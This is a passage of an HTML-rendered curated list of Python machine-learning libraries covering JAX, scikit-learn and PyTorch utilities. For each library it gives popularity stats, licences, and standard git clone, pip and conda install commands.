&lt;p&gt;&lt;a href=&#34;https://github.com/patrick-kidger/equinox&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 29 · 📦 19 · 📋 44 - 13% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/patrick-kidger/equinox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/equinox&#34;&gt;PyPi&lt;/a&gt; (📥 1.4K / month · 📦 4 · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install equinox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 1 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ucl-bug/jaxdf&#34;&gt;jaxdf&lt;/a&gt;&lt;/b&gt; (🥉9 · ⭐ 50) - A JAX-based research framework for writing differentiable.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/37RvQcA&#34;&gt;❗️LGPL-3.0&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://jax.readthedocs.io/en/latest/_static/favicon.png&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Sklearn Utilities&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries that extend scikit-learn with additional capabilities.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rasbt/mlxtend&#34;&gt;MLxtend&lt;/a&gt;&lt;/b&gt; (🥇35 · ⭐ 3.9K) - A library of extension and helper modules for Pythons data.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rasbt/mlxtend&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 89 · 🔀 750 · 📦 6K · 📋 420 - 25% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rasbt/mlxtend&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mlxtend&#34;&gt;PyPi&lt;/a&gt; (📥 1.4M / month · 📦 140 · ⏱️ 03.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mlxtend&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/mlxtend&#34;&gt;Conda&lt;/a&gt; (📥 200K · ⏱️ 03.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge mlxtend&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/imbalanced-learn&#34;&gt;imbalanced-learn&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 5.9K) - A Python Package to Tackle the Curse of Imbalanced.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/imbalanced-learn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 63 · 🔀 1.2K · 📦 11K · 📋 510 - 9% open · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scikit-learn-contrib/imbalanced-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/imbalanced-learn&#34;&gt;PyPi&lt;/a&gt; (📥 2.7M / month · 📦 260 · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install imbalanced-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/imbalanced-learn&#34;&gt;Conda&lt;/a&gt; (📥 210K · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge imbalanced-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/category_encoders&#34;&gt;category_encoders&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 1.9K) - A library of sklearn compatible categorical variable.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/category_encoders&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 52 · 🔀 350 · 📦 3.4K · 📋 250 - 29% open · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scikit-learn-contrib/category_encoders&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/category_encoders&#34;&gt;PyPi&lt;/a&gt; (📥 3.3M / month · 📦 23 · ⏱️ 14.10.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install category_encoders&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/category_encoders&#34;&gt;Conda&lt;/a&gt; (📥 160K · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge category_encoders&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/guofei9987/scikit-opt&#34;&gt;scikit-opt&lt;/a&gt;&lt;/b&gt; (🥈25 · ⭐ 3.2K) - Genetic Algorithm, Particle Swarm Optimization, Simulated.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/guofei9987/scikit-opt&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 14 · 🔀 760 · 📦 74 · 📋 150 - 27% open · ⏱️ 08.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/guofei9987/scikit-opt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/scikit-opt&#34;&gt;PyPi&lt;/a&gt; (📥 2.3K / month · 📦 6 · ⏱️ 14.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install scikit-opt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/iskandr/fancyimpute&#34;&gt;fancyimpute&lt;/a&gt;&lt;/b&gt; (🥈25 · ⭐ 1.1K · 💤) - Multivariate imputation and matrix completion.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/iskandr/fancyimpute&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 170 · 📦 1.2K · 📋 110 - 0% open · ⏱️ 21.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/iskandr/fancyimpute&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fancyimpute&#34;&gt;PyPi&lt;/a&gt; (📥 14K / month · 📦 29 · ⏱️ 21.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fancyimpute&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/koaning/scikit-lego&#34;&gt;scikit-lego&lt;/a&gt;&lt;/b&gt; (🥈25 · ⭐ 820) - Extra blocks for scikit-learn pipelines. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/koaning/scikit-lego&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 50 · 🔀 85 · 📦 48 · 📋 240 - 9% open · ⏱️ 20.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/koaning/scikit-lego&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/scikit-lego&#34;&gt;PyPi&lt;/a&gt; (📥 15K / month · 📦 6 · ⏱️ 20.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install scikit-lego&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/scikit-lego&#34;&gt;Conda&lt;/a&gt; (📥 18K · ⏱️ 21.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge scikit-lego&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/lightning&#34;&gt;sklearn-contrib-lightning&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.6K) - Large-scale linear classification, regression and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/lightning&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 200 · 📥 230 · 📦 100 · 📋 93 - 54% open · ⏱️ 30.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scikit-learn-contrib/lightning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sklearn-contrib-lightning&#34;&gt;PyPi&lt;/a&gt; (📥 2K / month · 📦 6 · ⏱️ 30.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sklearn-contrib-lightning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sklearn-contrib-lightning&#34;&gt;Conda&lt;/a&gt; (📥 160K · ⏱️ 13.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sklearn-contrib-lightning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/yzhao062/combo&#34;&gt;combo&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 580 · 💤) - (AAAI 20) A Python Toolbox for Machine Learning Model.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;xgboost&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/yzhao062/combo&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1 · 🔀 99 · 📦 460 · 📋 14 - 78% open · ⏱️ 02.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/yzhao062/combo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/combo&#34;&gt;PyPi&lt;/a&gt; (📥 33K / month · 📦 3 · ⏱️ 02.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install combo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/trent-b/iterative-stratification&#34;&gt;iterative-stratification&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 650) - scikit-learn cross validators for iterative.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/trent-b/iterative-stratification&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 61 · 📦 210 · 📋 19 - 21% open · ⏱️ 11.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/trent-b/iterative-stratification&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/iterative-stratification&#34;&gt;PyPi&lt;/a&gt; (📥 2.2M / month · 📦 8 · ⏱️ 03.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install iterative-stratification&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/DESlib&#34;&gt;DESlib&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 400 · 💤) - A Python library for dynamic classifier and ensemble selection. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/DESlib&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 73 · 📦 25 · 📋 140 - 11% open · ⏱️ 10.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scikit-learn-contrib/DESlib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deslib&#34;&gt;PyPi&lt;/a&gt; (📥 550 / month · 📦 2 · ⏱️ 08.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deslib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-tda/scikit-tda&#34;&gt;scikit-tda&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 340) - Topological Data Analysis for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scikit-tda/scikit-tda&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 4 · 🔀 43 · 📦 31 · 📋 19 - 78% open · ⏱️ 13.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scikit-tda/scikit-tda&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/scikit-tda&#34;&gt;PyPi&lt;/a&gt; (📥 1.4K / month · ⏱️ 03.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install scikit-tda&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 6 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/TeamHG-Memex/sklearn-crfsuite&#34;&gt;sklearn-crfsuite&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 400 · 💀) - scikit-learn inspired API for CRFsuite. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-multilearn/scikit-multilearn&#34;&gt;scikit-multilearn&lt;/a&gt;&lt;/b&gt; (🥈25 · ⭐ 750 · 💀) - A scikit-learn based module for multi-label et. al... &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/skope-rules&#34;&gt;skope-rules&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 460 · 💀) - machine learning with logical rules in Python. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=BSD-1-Clause&#34;&gt;❗️BSD-1-Clause&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mathurinm/celer&#34;&gt;celer&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 140) - Fast solver for L1-type problems: Lasso, sparse Logisitic regression,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/skggm/skggm&#34;&gt;skggm&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 200) - Scikit-learn compatible estimation of general graphical models. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/amueller/dabl&#34;&gt;dabl&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 110 · 💤) - Data Analysis Baseline Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Pytorch Utilities&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries that extend Pytorch with additional capabilities.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/KevinMusgrave/pytorch-metric-learning&#34;&gt;PML&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 4.4K) - The easiest way to use deep metric learning in your application. Modular,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/KevinMusgrave/pytorch-metric-learning&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 24 · 🔀 540 · 📦 260 · 📋 350 - 13% open · ⏱️ 30.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/KevinMusgrave/pytorch-metric-learning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorch-metric-learning&#34;&gt;PyPi&lt;/a&gt; (📥 2.2M / month · 📦 9 · ⏱️ 02.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorch-metric-learning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/metric-learning/pytorch-metric-learning&#34;&gt;Conda&lt;/a&gt; (📥 6.9K · ⏱️ 30.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c metric-learning pytorch-metric-learning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/huggingface/accelerate&#34;&gt;accelerate&lt;/a&gt;&lt;/b&gt; (🥇32 · ⭐ 2.5K) - A simple way to train and use PyTorch models with multi-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/huggingface/accelerate&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 44 · 🔀 170 · 📦 520 · 📋 230 - 37% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/huggingface/accelerate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/accelerate&#34;&gt;PyPi&lt;/a&gt; (📥 2.3M / month · 📦 13 · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install accelerate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/accelerate&#34;&gt;Conda&lt;/a&gt; (📥 2.1K · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge accelerate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PyTorchLightning/lightning-flash&#34;&gt;lightning-flash&lt;/a&gt;&lt;/b&gt; (🥇29 · ⭐ 1.5K) - Your PyTorch AI Factory - Flash enables you to easily.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PyTorchLightning/lightning-flash&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 69 · 🔀 170 · 📦 79 · 📋 460 - 6% open · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PyTorchLightning/lightning-flash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lightning-flash&#34;&gt;PyPi&lt;/a&gt; (📥 6.4K / month · 📦 3 · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lightning-flash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/lightning-flash&#34;&gt;Conda&lt;/a&gt; (📥 1.6K · ⏱️ 12.05.2022):&lt;/p&gt; 